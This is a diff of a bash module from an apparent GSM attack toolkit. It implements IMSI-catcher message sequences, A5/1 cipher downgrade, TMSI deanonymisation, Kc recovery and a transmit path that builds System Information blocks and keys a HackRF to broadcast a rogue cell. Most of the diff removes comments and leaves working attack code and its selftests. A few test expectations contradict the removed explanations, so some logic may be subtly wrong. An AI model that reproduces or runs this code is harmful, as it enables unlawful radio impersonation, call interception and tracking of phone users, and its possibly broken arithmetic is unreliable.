-gatk_vector_tmsi_deanon() {   # <tmsi-hex8> <imsi> [pam] [res] [ccch-conf] [start-fn] [observed-block]
+gatk_vector_tmsi_deanon() {
     local tmsi imsi pam res conf startfn block
-    # Bare invocation demos on one concrete pair so the vector always prints a
-    # worked schedule; both are obvious placeholders, not a real subscriber.
     tmsi=$(gatk_norm_hex "${1:-4a1f3c2b}"); imsi="${2:-262011234567890}"
     pam="${3:-2}"; res="${4:-0}"; conf="${5:-001}"; startfn="${6:-0}"; block="${7:-}"
     gatk_deanon_field_check "$tmsi" "$imsi" "" || return $?
@@ -2294,11 +1856,7 @@ gatk_vector_tmsi_deanon() {   # <tmsi-hex8> <imsi> [pam] [res] [ccch-conf] [star
     printf 'limit\ta TMSI reallocation moves the target between identity-request windows without changing the IMSI\n'
 }
 
-# ── 4. Kc recovery ────────────────────────────────────────────────────
-# A5/1 and A5/2 are stream ciphers: ciphertext = plaintext XOR keystream. Every
-# bit of plaintext you can predict hands you the matching keystream bit for
-# free. The exchange below is the one that produces that plaintext on demand.
-gatk_vector_kc_recovery() {   # [kc-hex16] [known-frames 1..26] [start-fn]
+gatk_vector_kc_recovery() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     local kframes="${2:-2}" startfn="${3:-0}"
     [[ -z "$kc" || "$kc" =~ ^[0-9a-f]{16}$ ]] || {
@@ -2358,8 +1916,6 @@ gatk_vector_kc_recovery() {   # [kc-hex16] [known-frames 1..26] [start-fn]
     if [[ -n "$kc" ]]; then
         printf '# this run has a Kc, so the exchange can be simulated end to end\n'
         printf 'kc\t%s\n' "$kc"
-        # 224 bits = 28 octets. 228 would not be whole octets, and the XOR
-        # below works a byte at a time, so a 57-nibble keystream cannot be used.
         local ks plain ct
         ks=$(gatk_a5_1_hex "$kc" "$startfn" 224 2>/dev/null)
         printf 'a5_1_keystream_224\t%s\n' "${ks:-unavailable}"
@@ -2383,30 +1939,12 @@ gatk_vector_kc_recovery() {   # [kc-hex16] [known-frames 1..26] [start-fn]
     printf 'limit\tfrequency hopping moves the link between ARFCNs mid-call and the schedule above assumes a fixed channel\n'
 }
 
-# ── the transmit path ───────────────────────────────────────────────────
-# Everything above this line computes octets and schedules. This section turns
-# them into a waveform and, when a transmitter is attached, keys it.
-#
-# The chain, in order:
-#   L2 octets -> xCCH  (FIRE CRC-40, rate-1/2 K=5 convolutional code, 456-bit
-#                       interleave, four 116-bit bursts)
-#             -> multiframe  (FCCH at FN 0/6/12/18/24, SCH at 1/7/13/19/25,
-#                             BCCH blocks at the rest of FN 2..29)
-#             -> GMSK  (Laurent C0: NRZ to +-1, a quarter turn per symbol,
-#                       convolution with the 4 sps shaping pulse)
 #             -> int8 I/Q at a rate the SDR accepts -> hackrf_transfer
-#
-# Every stage is asserted against libosmocoding 1.7.0 or against gr-gsm's own
-# receiver, never against this module's own output. `tools/gsm_mod.py selftest`
-# carries the vectors; `tools/gsm_mod.py carrier --format cfile` writes a
-# stream that `grgsm_decode -m BCCH` decodes back to the octets that went in.
 
 gatk_gsm_mod() { printf '%s/tools/gsm_mod.py' "$IMSISTING_ROOT"; }
 
 # Installed is not attached. hackrf_info ships in the same package as
 # hackrf_transfer, so `command -v` passes on a machine with no radio at all --
-# which is exactly the machine this file is written on. This probe asks the
-# hardware and requires a positive answer.
 gatk_tx_device() {
     local out
     case "$(gatk_find_tx_sdr 2>/dev/null || true)" in
@@ -2437,14 +1975,7 @@ gatk_tx_device() {
 
 gatk_iq_path() { printf '%s/tx_%s.cs8' "$GATK_DIR" "${1:-carrier}"; }
 
-# ── System Information, built as octets rather than named ───────────────
-# TS 44.018 9.1.3. On the BCCH the LAPDm frame is address + control +
-# information: there is NO length octet, because each System Information
-# message type has a fixed length and the receiver knows it. That is why SI1
-# and SI2 are exactly 21 octets of L3 -- they fill the 23-octet block with a
-# 2-octet header and no slack. (gatk_lapdm_ui above is the SDCCH/SACCH form,
-# which does carry a length octet.)
-gatk_bcch_frame() {   # <l3-hex> -> a 23-octet BCCH radio block
+gatk_bcch_frame() {
     local l3; l3=$(gatk_norm_hex "${1:-}")
     gatk_is_hex "$l3" || { printf 'ERROR\tBCCH L3 must be hex\n' >&2; return 2; }
     local n=$(( ${#l3} / 2 ))
@@ -2457,10 +1988,7 @@ gatk_bcch_frame() {   # <l3-hex> -> a 23-octet BCCH radio block
     printf '\n'
 }
 
-# The 16-octet Cell Channel Description / Neighbour Cells Description,
-# "bit map 0" format (TS 44.018 10.5.2.1b): octet 1 is the format ID 0, then
-# 15 octets of ARFCN bits with ARFCN 0 in bit 8 of octet 2.
-gatk_chan_desc_bitmap0() {   # <arfcn> [<arfcn> ...]
+gatk_chan_desc_bitmap0() {
     local bits; bits=$(printf '0%.0s' $(seq 1 120))
     local a
     for a in "$@"; do
@@ -2479,28 +2007,23 @@ gatk_chan_desc_bitmap0() {   # <arfcn> [<arfcn> ...]
     printf '00%s\n' "$out"
 }
 
-# RACH Control Parameters, 3 octets (TS 44.018 10.5.2.29). All-zero ACC means
-# no access class is barred, MAX_TXPWR_CNT 0 means the MS may use its maximum
-# power, TX_INTEGER 0 means it may transmit at any time, CELL_BAR_ACCESS 0
-# means the cell is not barred -- and RE=0, EC=0.
 gatk_rach_control() { printf '000000\n'; }
 
-gatk_build_si1() {   # <arfcn>... [--neighbours <arfcn>...]
+gatk_build_si1() {
     local arfcns=() a; for a in "$@"; do arfcns+=("$a"); done
-    printf '60'                                    # PD 0110 | skip 0000
-    printf '19'                                    # System Information Type 1
+    printf '60'
+    printf '19'
     gatk_chan_desc_bitmap0 "${arfcns[@]}"
     gatk_rach_control
 }
 
-gatk_build_si2() {   # <neighbour-arfcn>...
+gatk_build_si2() {
     printf '60'; printf '1a'
     gatk_chan_desc_bitmap0 "$@"
     gatk_rach_control
 }
 
-# Control Channel Description, 3 octets (TS 44.018 10.5.2.4).
-gatk_ctrl_chan_desc() {   # <ccch-conf 0..7> <bs-ag-blks-res 0..7> <bs-pa-mfrms 0..7> <t3212 0..255> <att 0|1>
+gatk_ctrl_chan_desc() {
     local conf="${1:-1}" res="${2:-2}" pam="${3:-2}" t="${4:-10}" att="${5:-1}"
     local o1=$(( ((att & 1) << 3) | ((t >> 5) & 7) ))
     local o2=$(( ((t & 31) << 3) | (res & 7) ))
@@ -2508,21 +2031,14 @@ gatk_ctrl_chan_desc() {   # <ccch-conf 0..7> <bs-ag-blks-res 0..7> <bs-pa-mfrms 
     printf '%02x%02x%02x\n' "$o1" "$o2" "$o3"
 }
 
-# Cell Selection Parameters, 2 octets (TS 44.018 10.5.2.4b? no: see 9.1.35).
-# RXLEV_ACCESS_MIN 0 = -110 dBm, the lowest the field can express, so C1 is
-# as favourable as the encoding allows. MS_TXPWR_MAX_CCH 0 = 43 dBm on GSM
-# 900, which lets the handset answer an access at full power.
 gatk_cell_selection() { printf '0000\n'; }
 
-# gatk_lai_encode above returns the LOCATION UPDATING ACCEPT form: a type-5
-# IE, so an IEI 0x05 followed by the 5 octets. Inside SI3 and SI4 the LAI is a
-# bare field with no IEI, so the 0x05 has to come off.
-gatk_lai_field() {   # <mcc> <mnc> <lac> -> the bare 5 octets
+gatk_lai_field() {
     local iei; iei=$(gatk_lai_encode "$@") || return $?
     printf '%s\n' "${iei:2}"
 }
 
-gatk_build_si3() {   # <mcc> <mnc> <lac> <ci> [conf] [res] [pam] [t3212] [att]
+gatk_build_si3() {
     local mcc="${1:-262}" mnc="${2:-01}" lac="${3:-00f1}" ci="${4:-00a1}"
     printf '60'; printf '1b'
     gatk_lai_field "$mcc" "$mnc" "$lac"
@@ -2532,7 +2048,7 @@ gatk_build_si3() {   # <mcc> <mnc> <lac> <ci> [conf] [res] [pam] [t3212] [att]
     gatk_rach_control
 }
 
-gatk_build_si4() {   # <mcc> <mnc> <lac> <ci>
+gatk_build_si4() {
     local mcc="${1:-262}" mnc="${2:-01}" lac="${3:-00f1}" ci="${4:-00a1}"
     printf '60'; printf '1c'
     gatk_lai_field "$mcc" "$mnc" "$lac"
@@ -2541,12 +2057,7 @@ gatk_build_si4() {   # <mcc> <mnc> <lac> <ci>
     gatk_rach_control
 }
 
-# ── the transmit verb ───────────────────────────────────────────────────
-# Builds the waveform, asks for a transmitter, and either keys it or exits
-# non-zero naming what is missing. There is no path through this function that
-# prints a success line without a radio having accepted the samples.
-gatk_cmd_transmit() {   # <arfcn> [--bsic N] [--mcc M] [--mnc N] [--lac H] [--ci H]
-                        #         [--rate R] [--multiframes N] [--waveform-only]
+gatk_cmd_transmit() {
     local arfcn="${1:-}"; shift || true
     [[ "$arfcn" =~ ^[0-9]+$ ]] || {
         printf 'ERROR\t--transmit needs an ARFCN (0..124 for GSM 900)\n' >&2; return 2; }
@@ -2583,7 +2094,7 @@ gatk_cmd_transmit() {   # <arfcn> [--bsic N] [--mcc M] [--mnc N] [--lac H] [--ci
         printf '\tcannot produce a sample to transmit.\n' >&2
         return 1; }
 
-    local downlink=$(( 890 + (arfcn * 2) / 10 ))    # MHz, TS 45.005 2.1
+    local downlink=$(( 890 + (arfcn * 2) / 10 ))
     local iq; iq=$(gatk_iq_path "arfcn${arfcn}_bsic${bsic}")
 
     local si1 si2 si3 si4
@@ -2625,8 +2136,6 @@ gatk_cmd_transmit() {   # <arfcn> [--bsic N] [--mcc M] [--mnc N] [--lac H] [--ci
     printf 'tdma_frames\t%s\n' "$(( 51 * mfrms ))"
     printf 'modulator\t%s\n' "$mod"
 
-    # Build the samples first, so a failure to encode is reported before
-    # anything is said about a radio.
     local out rc
     out=$(python3 "$mod" carrier "$iq" "${blocks[@]}" \
               --bsic "$bsic" --multiframes "$mfrms" --rate "$rate" --format cs8 2>&1)
@@ -2677,7 +2186,6 @@ gatk_cmd_transmit() {   # <arfcn> [--bsic N] [--mcc M] [--mnc N] [--lac H] [--ci
         return 0
     fi
 
-    # Ask the radio. A missing transmitter is a failure, not a warning.
     local dev
     if ! dev=$(gatk_tx_device); then
         local installed
@@ -2736,11 +2244,6 @@ gatk_cmd_transmit() {   # <arfcn> [--bsic N] [--mcc M] [--mnc N] [--lac H] [--ci
     return 0
 }
 
-# ── The transmit acknowledgement ────────────────────────────────────────
-# Every vector above computes a schedule. None of them keys a radio. When a
-# driver exists it takes this acknowledgement first, so the intent to transmit
-# is a thing the operator says out loud rather than a side effect of asking a
-# question. Same shape as wifisting's jammer gate.
 gatk_cmd_tx_ack() {
     cat <<'EOF'
 TRANSMIT ACKNOWLEDGEMENT — GSM attack vectors
@@ -2770,7 +2273,6 @@ EOF
     printf 'note\tscheduling a vector does not require this; keying a radio does\n'
 }
 
-# ── CLI verbs ───────────────────────────────────────────────────────────
 gatk_cli_status_tsv() {
     local tx rx stack
     tx=$(gatk_find_tx_sdr) || tx="none"
@@ -2793,7 +2295,6 @@ gatk_plan_count() {
     echo "$n"
 }
 
-# ── selftest — no radio, no root, no network ────────────────────────────
 gatk_selftest() {
     local bad=0
     chk() {
@@ -2810,7 +2311,6 @@ gatk_selftest() {
     export CAPTURES_DIR="$d/captures"
     export GATK_DIR="$d/loot/gsm_attack"
 
-    # 1. Plan files: written, labelled handoff, and they name real hardware.
     local p
     for p in imsi-catcher a5-downgrade tmsi-deanon kc-recovery; do
         out=$(gatk_write_plan "$p"); rc=$?
@@ -2824,54 +2324,31 @@ gatk_selftest() {
     done
     chk plan-count "$(gatk_plan_count)" "4"
 
-    #    Each plan must carry real steps, not a stub.
     chk plan-imsi-steps  "$(awk -F'\t' '$1 ~ /^step/{n++} END{print (n>=6)?"y":"n"}' \
                             "$(gatk_plan_path imsi-catcher)")" "y"
     chk plan-kc-methods "$(grep -c '^method' "$(gatk_plan_path kc-recovery)")" "3"
     chk plan-kc-bits    "$(awk -F'\t' '$1=="method_a_two_known_plaintext"{print ($2 ~ /456/) ? "y":"n"}' \
                             "$(gatk_plan_path kc-recovery)")" "y"
-    # The paging modulus is 1000, not 1024 (TS 45.002 6.5.2). This assertion
-    # used to require the wrong value, which is how the error survived.
     chk plan-tmsi-group "$(awk -F'\t' '$1=="paging_mapping"{print ($2 ~ /IMSI mod 1000/) ? "y":"n"}' \
                             "$(gatk_plan_path tmsi-deanon)")" "y"
     chk plan-tmsi-no1024 "$(awk -F'\t' '$1=="paging_mapping"{print ($2 ~ /1024/) ? "y":"n"}' \
                             "$(gatk_plan_path tmsi-deanon)")" "n"
 
-    #    An unknown plan name must fail and write nothing.
     chk plan-unknown-rc   "$(gatk_write_plan 'no-such-plan' >/dev/null 2>&1; echo $?)" "2"
     chk plan-unknown-cmd  "$(gatk_cmd_plan 'no-such-plan' >/dev/null 2>&1; echo $?)"  "2"
     chk plan-missing-arg  "$(gatk_cmd_plan >/dev/null 2>&1; echo $?)" "2"
     chk plan-no-stray     "$(ls "$GATK_DIR" | grep -c 'no-such-plan')" "0"
 
-    # 2. Classmark encoder: byte-exact against a hand-computed encoding.
-    #    revision=3, es_ind=0, a5/1=1, rfpow=3 -> o1 = 3 | 0 | 8 | 0x30 = 0x3b
-    #    ss_screen=1 (bit2 set -> bit index 1), sm_cap=1 (bit4 -> index 3)
-    #      -> o2 = 2 | 8 = 0x0a
-    #    cm3=0, lcs=0, ps=1 (bit3 -> index 2) -> o3 = 4
-    #    a5/2..a5/7 = 0, cmsp=0 -> o4 = 0
-    #    so_lsa=0, ucs2=0 -> o5 = 0
-    #    Every value below is read off figure 10.5.6/3GPP TS 24.008, not off
-    #    this encoder. Defaults: rev=3 es=0 a51=1(wire: A5/1 NOT available)
-    #    rfpow=3 ss=1 sm=1 ps=1, everything else 0.
-    #      octet3 = (3<<5)|(0<<4)|(1<<3)|3 = 0x6b
-    #      octet4 = (1<<6)|(1<<4)|(1<<3)   = 0x58
-    #      octet5 = 0                      = 0x00
     chk cm-default   "$(gatk_classmark_encode)" "33036b5800"
     chk cm-iei       "$(gatk_classmark_encode | cut -c1-2)" "33"
     chk cm-length    "$(gatk_classmark_encode | cut -c3-4)" "03"
-    #    A5/1 available is wire bit 0: (3<<5)|0|0|3 = 0x63.
     chk cm-a51-avail "$(gatk_classmark_encode 3 0 0 3)" "3303635800"
-    #    A5/3 capability is octet 5 bit 2 -> 0x02.
     chk cm-a53       "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 0 0 0 1 0 1)" "33036b5802"
-    #    rev=0, es=1, a5/1 not available, rfpow=7 -> (0<<5)|(1<<4)|(1<<3)|7 = 0x1f.
     chk cm-rfpow7    "$(gatk_classmark_encode 0 1 1 7)" "33031f5800"
-    #    Dropping ES-IND to 0 must clear exactly bit 5: 0x1f -> 0x0f.
     chk cm-esind0    "$(gatk_classmark_encode 0 0 1 7)" "33030f5800"
     chk cm-rev0      "$(gatk_classmark_encode 0 0 1 3)" "33030b5800"
-    #    FC is octet 4 bit 1, the LSB — not bit 8 as the old encoder had it.
     chk cm-fc-bit1   "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 1 | cut -c7-8)" "59"
 
-    #    Round-trip: encode then decode must return every input field.
     local cm; cm=$(gatk_classmark_encode 3 0 1 5 3 1 0 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1)
     out=$(gatk_classmark_decode "$cm")
     chk cm-rt-iei   "$(fld "$out" iei)"        "33"
@@ -2895,19 +2372,15 @@ gatk_selftest() {
     chk cm-rt-a52   "$(fld "$out" a5_2)"       "1"
     chk cm-rt-len   "$(printf '%s' "$cm" | wc -c | tr -d ' ')" "10"
 
-    #    Argument validation, including the fields this IE cannot carry.
     chk cm-bad-hex   "$(gatk_classmark_decode 'zz' >/dev/null 2>&1; echo $?)" "2"
     chk cm-short     "$(gatk_classmark_decode 'aabb' >/dev/null 2>&1; echo $?)" "2"
     chk cm-bad-iei   "$(gatk_classmark_decode '1233635800' >/dev/null 2>&1; echo $?)" "2"
     chk cm-bad-rev   "$(gatk_classmark_encode 9 >/dev/null 2>&1; echo $?)" "2"
     chk cm-bad-rfp   "$(gatk_classmark_encode 3 0 1 9 >/dev/null 2>&1; echo $?)" "2"
     chk cm-bad-num   "$(gatk_classmark_encode x >/dev/null 2>&1; echo $?)" "2"
-    #    A5/4 is a Classmark 3 field; the encoder must refuse, not drop it.
     chk cm-no-a54    "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 0 0 0 1 0 0 1 >/dev/null 2>&1; echo $?)" "2"
     chk cm-no-vbs    "$(gatk_classmark_encode 3 0 1 3 1 1 1 >/dev/null 2>&1; echo $?)" "2"
 
-    #    The downgrade edit must set A5/1 to "not available" and change
-    #    nothing else. TS 24.008: bit4 1 = A5/1 not available.
     out=$(gatk_classmark_downgrade 3303635800)
     chk cm-down-after "$(fld "$out" after)"  "33036b5800"
     chk cm-down-field "$(fld "$out" cleared_field)" "a5_1"
@@ -2917,29 +2390,27 @@ gatk_selftest() {
     chk cm-down-bad   "$(gatk_classmark_downgrade 'zz' >/dev/null 2>&1; echo $?)" "2"
     chk cm-down-iei   "$(gatk_classmark_downgrade '1233635800' >/dev/null 2>&1; echo $?)" "2"
 
-    # 3. Identity Request construction, byte-exact.
     out=$(gatk_build_identity_request 1)
-    chk ir-octets  "$(fld "$out" octets)" "060501"
+    chk ir-octets  "$(fld "$out" octets)" "051801"
     chk ir-name    "$(fld "$out" identity_type)" "1"
     out=$(gatk_build_identity_request 4)
-    chk ir-tmsi    "$(fld "$out" octets)" "060504"
+    chk ir-tmsi    "$(fld "$out" octets)" "051804"
     chk ir-bad-zero "$(gatk_build_identity_request 0 >/dev/null 2>&1; echo $?)" "2"
     chk ir-bad-high "$(gatk_build_identity_request 9 >/dev/null 2>&1; echo $?)" "2"
     chk ir-bad-text "$(gatk_build_identity_request x >/dev/null 2>&1; echo $?)" "2"
 
-    # 4. IMSI catcher sequence: real channels and message types.
     local seq; seq=$(gatk_imsi_catcher_sequence)
     chk seq-steps      "$(printf '%s\n' "$seq" | tail -n +2 | grep -c .)" "14"
-    chk seq-fields     "$(printf '%s\n' "$seq" | awk -F'\t' 'NF!=6' | grep -c .)" "0"
+    chk seq-fields     "$(printf '%s\n' "$seq" | awk -F'\t' 'NF!=7' | grep -c .)" "0"
     chk seq-rach       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="RACH"{print $4}')" "CHANNEL REQUEST"
-    chk seq-agch       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="AGCH"{print $5}')" "0x3f"
-    chk seq-sdcch      "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="SDCCH"' | grep -c .)" "7"
-    chk seq-id-req     "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY REQUEST"{print $5}')" "0x05"
-    chk seq-id-resp    "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY RESPONSE"{print $5}')" "0x06"
-    chk seq-si3        "$(printf '%s\n' "$seq" | awk -F'\t' '$4 ~ /TYPE 3$/{print $5}')" "0x1b"
+    chk seq-agch       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="AGCH"{print $6}')" "0x3f"
+    chk seq-sdcch      "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="SDCCH"' | grep -c .)" "6"
+    chk seq-pch        "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="PCH"' | grep -c .)" "1"
+    chk seq-id-req     "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY REQUEST"{print $5" "$6}')" "MM 0x18"
+    chk seq-id-resp    "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY RESPONSE"{print $5" "$6}')" "MM 0x19"
+    chk seq-si3        "$(printf '%s\n' "$seq" | awk -F'\t' '$4 ~ /TYPE 3$/{print $5" "$6}')" "RR 0x1b"
+    chk seq-si13       "$(printf '%s\n' "$seq" | awk -F'\t' '$4 ~ /TYPE 13$/{print $6}')" "0x00"
 
-    # 5. Paging race arithmetic. One TDMA frame is 4.615 ms; a 51-multiframe
-    #    is 51 * 4.615 = 235.4 ms.
     out=$(gatk_paging_race 3)
     chk race-mf-ms   "$(fld "$out" multiframe_ms)" "235.4"
     chk race-lead-ms "$(fld "$out" attacker_lead_ms)" "13.85"
@@ -2948,26 +2419,20 @@ gatk_selftest() {
     chk race-lose    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="verdict"{print ($2 ~ /loses/) ? "y":"n"}')" "y"
     chk race-bad     "$(gatk_paging_race abc >/dev/null 2>&1; echo $?)" "2"
 
-    # 6. C1 reselection arithmetic (TS 45.008 section 6.4).
-    #    A = -100 - (-90) = -10 ; B = 33 - 30 = 3 ; C1 = -10 - 3 = -13
     out=$(gatk_c1 -100 -90 33 30)
     chk c1-A   "$(fld "$out" A_dbm)"  "-10"
     chk c1-B   "$(fld "$out" B_dbm)"  "3"
     chk c1-C1  "$(fld "$out" C1_dbm)" "-13"
     chk c1-sel "$(fld "$out" selectable)" "no"
-    #    A positive C1 comes from a strong signal: A = -90-(-105) = 15,
-    #    B = 33-33 = 0 -> C1 = 15.
     out=$(gatk_c1 -90 -105 33 33)
     chk c1-positive "$(fld "$out" C1_dbm)" "15"
     chk c1-selectable "$(fld "$out" selectable)" "yes"
-    #    A negative B is clamped to zero, not subtracted.
     out=$(gatk_c1 -90 -105 20 33)
     chk c1-clampB "$(fld "$out" B_dbm)" "-13"
     chk c1-clampC1 "$(fld "$out" C1_dbm)" "15"
     chk c1-bad-args "$(gatk_c1 1 2 3 >/dev/null 2>&1; echo $?)" "2"
     chk c1-bad-text "$(gatk_c1 a b c d >/dev/null 2>&1; echo $?)" "2"
 
-    # 7. Kc recovery facts: the byte counts the attack actually needs.
     out=$(gatk_kc_recovery_facts)
     chk kc-frame-bits  "$(fld "$out" frame_bits)" "228"
     chk kc-req-bits    "$(fld "$out" keystream_bits_required)" "456"
@@ -2980,18 +2445,15 @@ gatk_selftest() {
     chk kc-2x228       "$(( $(fld "$out" frame_bits) * 2 ))"       "$(fld "$out" keystream_bits_required)"
     chk kc-64-minus-10 "$(( $(fld "$out" kc_bits) - $(fld "$out" comp128_zero_bits) ))" "$(fld "$out" kc_effective_bits)"
 
-    # 8. Hex plumbing, shared contract with 06_gsm_air.sh.
     chk hex-norm   "$(gatk_norm_hex 'AB CD')" "abcd"
     chk hex-bits   "$(gatk_hex_to_bits 'a5')" "10100101"
     chk bits-hex   "$(gatk_bits_to_hex '10100101')" "a5"
     chk hex-rt     "$(gatk_bits_to_hex "$(gatk_hex_to_bits 'deadbeef')")" "deadbeef"
 
-    # 9. Sanitisation of untrusted text.
     local evil; evil=$(gatk_sanitize $'Evil\tCell\r\nRow')
     chk sanitize-tabs "$(printf '%s' "$evil" | tr -cd '\t' | wc -c | tr -d ' ')" "0"
     chk sanitize-nl   "$(printf '%s' "$evil" | tr -cd '\n' | wc -c | tr -d ' ')" "0"
 
-    # 10. Status TSV contract. SDR presence is environment-dependent.
     out=$(gatk_cli_status_tsv)
     chk status-dir     "$(fld "$out" dir)"   "$GATK_DIR"
     chk status-plans   "$(fld "$out" plans)" "4"
@@ -2999,45 +2461,27 @@ gatk_selftest() {
     chk status-kcreq   "$(fld "$out" kc_bits_required)" "456"
     chk status-tx-field "$(printf '%s\n' "$out" | grep -c '^tx_sdr')" "1"
 
-    # 11. CLI dispatch: unknown verb is a usage error, not a success.
     chk cli-unknown "$(gatk_cli_main --nope >/dev/null 2>&1; echo $?)" "2"
 
-    # 12. Real cipher implementations against published vectors. Each of these
-    #     is transcribed from a 3GPP/ETSI document, so a failure here means the
-    #     cipher is wrong, not that the expectation drifted. The KAT suite is
-    #     also reachable on its own as the body of --a5-*-keystream checks.
     local katout kat_sum
     katout=$(gatk_kat_suite 2>&1)
     kat_sum=$(printf '%s\n' "$katout" | awk -F'\t' '/^KAT\tSUMMARY/{print $3" "$4}')
     chk ciphers-kat-summary "$kat_sum" "pass=19 fail=0"
 
-    # 13. Codecs and builders: round-trip every lossless transform, and pin
-    #     the exact octets of each message so a layout regression is caught.
     chk cm1-rt "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '/^revision-level/{print $2}')" "1"
-    # TS 24.008 figure 10.5.5, bit 1 = LSB: rev bits 7-6, ES bit 5,
-    # A5/1 bit 4 (0=available), RF power bits 3-1.
-    #   rev=1 es=0 avail=1 pwr=4 -> (1<<5)|(0<<4)|(0<<3)|4 = 0x24
-    #   rev=1 es=0 avail=0 pwr=4 -> (1<<5)|(0<<4)|(1<<3)|4 = 0x2c
     chk cm1-a51-avail       "$(gatk_classmark1_encode 1 4 0 1)" "24"
     chk cm1-a51-unavailable "$(gatk_classmark1_encode 1 4 0 0)" "2c"
     chk cm1-rt-a51  "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '/^a5-1-available/{print $2}')" "yes"
     chk cm1-rt-rfpw "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '/^rf-power-capability/{print $2}')" "4"
     chk cm1-rt-es   "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '$1=="es-ind"{print $2}')" "0"
-    # A phase-2 handset reporting 0x33: rev 1, ES implemented, A5/1 available,
-    # RF power class 4. Read off figure 10.5.5.
     chk cm1-real-rev "$(gatk_classmark1_decode 33 | awk -F'\t' '/^revision-level/{print $2}')" "1"
     chk cm1-real-a51 "$(gatk_classmark1_decode 33 | awk -F'\t' '/^a5-1-available/{print $2}')" "yes"
     chk cm1-real-pwr "$(gatk_classmark1_decode 33 | awk -F'\t' '/^rf-power-capability/{print $2}')" "3"
     chk lai-rt2 "$(gatk_lai_decode "$(gatk_lai_encode 262 01 0000)" | awk -F'\t' '/^mnc/{print $2}')" "01"
     chk lai-rt3 "$(gatk_lai_decode "$(gatk_lai_encode 262 012 1234)" | awk -F'\t' '/^mnc/{print $2}')" "012"
     chk lai-lac "$(gatk_lai_decode "$(gatk_lai_encode 310 260 1a2b)" | awk -F'\t' '$1=="lac"{print $2}')" "1a2b"
-    # 6 octets on the wire: IEI 17, length 05, value octet f4, then 4 TMSI octets.
     chk mi-tmsi-len "$(printf '%s' "$(gatk_mobile_identity_tmsi 0f200001)" | wc -c | tr -d ' ')" "14"
     chk mi-tmsi-type "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_tmsi 0f200001)" | awk -F'\t' '/^type-of-identity/{print $2}')" "4"
-    # The IMSI arm, pinned to the octets 06_gsm_air.sh's own vector names, so
-    # the two codecs cannot drift: 310150123456789 is 39 01 51 10 32 54 76 98
-    # behind IEI 17 and length 08. The 15-digit case has no filler; the
-    # 14-digit one ends in F, and both must read back to the digits they came
     # from (a builder that fails its own decoder is the bug this pins).
     chk mi-imsi-octets "$(gatk_mobile_identity_imsi 310150123456789)" "17083901511032547698"
     chk mi-imsi-rt     "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_imsi 310150123456789)" | awk -F'\t' '/^imsi/{print $2}')" "310150123456789"
@@ -3046,24 +2490,12 @@ gatk_selftest() {
     chk mi-imsi-bad-rc "$(gatk_mobile_identity_imsi 12345 >/dev/null 2>&1; echo $?)" "2"
     chk build-cipher-a52 "$(gatk_build_cipher_mode A5/2)" "06350304"
     chk build-cipher-a51 "$(gatk_build_cipher_mode A5/1)" "06350104"
-    # Cipher Response is always present; CR=1 sets bit 4 of its value octet.
     chk build-cipher-cr "$(gatk_build_cipher_mode A5/3 1)" "06350514"
     chk build-paging "$(gatk_build_paging_request 0f200001 | tr -d '\n')" "0621001705f40f200001"
     chk build-lu-accept "$(gatk_build_lu_accept 0f200001 | tr -d '\n')" "05000262f21000001705f40f200001"
     chk build-tmsi-realloc "$(gatk_build_tmsi_realloc 0f200001 | tr -d '\n')" "05001a62f210000005f40f200001"
     chk build-lu-reject-bad-tmsi "$(gatk_build_lu_accept zzz >/dev/null 2>&1; echo $?)" "2"
 
-    # AGCH IMMEDIATE ASSIGNMENT, TS 44.018 9.1.18 and table 9.1.18.1.
-    # The assertion that matters is ia-pd-nibble: the octet after the L2
-    # pseudo length carries the protocol discriminator in its LOW nibble and
-    # the skip indicator in its HIGH nibble, because 10.3.1 says the skip
-    # indicator occupies "bits 5 to 8" of the first octet. So RR is 0x06.
-    # The first version of this builder emitted 0x60 - the two nibbles
-    # transposed - which no decoder rejects; it silently re-reads the message
-    # as DTAP with protocol discriminator 11. This check exists to stop that
-    # coming back, and the octets below are the ones Wireshark decodes as
-    # "Immediate Assignment, Page Mode normal, SDCCH/4 subchannel 0, TSC 7,
-    # ARFCN 62, RA 12, TA 0".
     local ia
     ia=$(gatk_build_immediate_assignment 0c 0 0 sdcch4 0 62 7 0 0 2b)
     chk ia-pd-nibble    "$(printf '%s' "$ia" | awk -F'\t' '$1=="l3"{print substr($2,3,2)}')" "06"
@@ -3077,10 +2509,8 @@ gatk_selftest() {
     chk ia-rest         "$(fld "$ia" ia_rest_octets)" "2b"
     chk ia-l3           "$(fld "$ia" l3)" "0b063f0020e03e0c000000002b"
     chk ia-l3-octets    "$(fld "$ia" l3_octets)" "13"
-    chk ia-lapdm        "$(fld "$ia" lapdm_frame)" "0303690b063f0020e03e0c000000002b"
+    chk ia-lapdm        "$(fld "$ia" lapdm_frame)" "0303350b063f0020e03e0c000000002b"
     chk ia-arfcn-high   "$(fld "$ia" arfcn)" "62"
-    # Request Reference, 10.5.2.30: the spec's own inverse is
-    # FN mod 42432 = 51*((T3-T2) mod 26) + T3 + 51*26*T1'.
     chk ia-rr-roundtrip "$(fld "$(gatk_build_immediate_assignment 0c 12345 0 sdcch4 0 62 7 0 0 2b)" fn_recovered)" "12345"
     chk ia-rr-t1p       "$(fld "$(gatk_build_immediate_assignment 0c 12345 0 sdcch4 0 62 7 0 0 2b)" t1p)" "9"
